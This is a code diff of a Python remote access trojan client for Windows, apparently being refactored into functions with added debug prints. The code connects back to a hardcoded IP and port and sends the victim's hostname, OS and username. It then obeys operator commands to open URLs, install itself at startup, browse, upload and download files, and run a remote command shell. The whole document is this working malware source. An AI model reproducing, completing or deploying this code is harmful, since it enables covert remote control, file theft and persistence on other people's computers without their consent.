@@ -3,7 +3,8 @@ import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
 
-strHost = "10.5.45.28"
+
+strHost = "10.5.29.45"
 # strHost = socket.gethostbyname("")
 intPort = 5888
 
@@ -19,17 +20,19 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     sys.exit(0)
 
 
-while True:  # infinite loop until socket can connect
-    try:
-        objSocket = socket.socket()
-        objSocket.connect((strHost, intPort))
-    except socket.error:
-        time.sleep(5)  # wait 5 seconds to try again
-    else: break
+def connect_socket():
+    while True:  # infinite loop until socket can connect
+        try:
+            global objSocket
+            objSocket = socket.socket()
+            objSocket.connect((strHost, intPort))
+        except socket.error:
+            time.sleep(5)  # wait 5 seconds to try again
+        else: break
 
-strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
-objSocket.send(str.encode(strUserInfo))
-del strUserInfo  # delete data after it has been sent
+    strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
+    objSocket.send(str.encode(strUserInfo))
+    del strUserInfo  # delete data after it has been sent
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
@@ -117,14 +120,18 @@ def upload(data):
     intBuffer = int(data)
     file_data = recvall(intBuffer)
     strOutputFile = decode_utf8(objSocket.recv(1024))
-
+    print ("I am here befor try")
     try:
         objFile = open(strOutputFile, "wb")
         objFile.write(file_data)
+        print ("I am here 1")
         objFile.close()
+        print ("I am here 2")
         objSocket.send(str.encode("Done!!!"))
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
+
+    # objSocket.close()
 
 
 def receive(data):
@@ -191,30 +198,29 @@ def run_command(command):
     objSocket.send(bytData)  # send output
 
 
-try:
-    while True:
-        strData = objSocket.recv(1024)
-        strData = decode_utf8(strData)
-
-        if strData == "exit":
-            objSocket.close()
-            sys.exit(0)
-        elif strData[:4] == "site":
-            webbrowser.get().open(strData[4:])
-        elif strData == "startup":
-            startup()
-        elif strData == "filebrowser":
-            file_browser()
-        elif strData[:4] == "send":
-            upload(strData[4:])
-        elif strData[:4] == "recv":
-            receive(strData[4:])
-        elif strData == "test":
-            continue
-        elif strData == "cmd":
-            command_shell()
-        elif strData[:6] == "runcmd":
-            run_command(strData[6:])
-except socket.error:  # if the server closes without warning
-    objSocket.close()
-    sys.exit(0)
+def execute_command():
+    # try:
+    strData = objSocket.recv(1024)
+    strData = decode_utf8(strData)
+    print (strData + "here")
+    if strData == "exit":
+        objSocket.close()
+        sys.exit(0)
+    elif strData[:4] == "site":
+        webbrowser.get().open(strData[4:])
+    elif strData == "startup":
+        startup()
+    elif strData == "filebrowser":
+        file_browser()
+    elif strData[:4] == "send":
+        print ("I am here in send")
+        upload(strData[4:])
+    elif strData[:4] == "recv":
+        receive(strData[4:])
+    elif strData == "cmd":
+        command_shell()
+    elif strData[:6] == "runcmd":
+        run_command(strData[6:])
+    # except socket.error:  # if the server closes without warning
+    #     objSocket.close()
+    #     sys.exit(0)
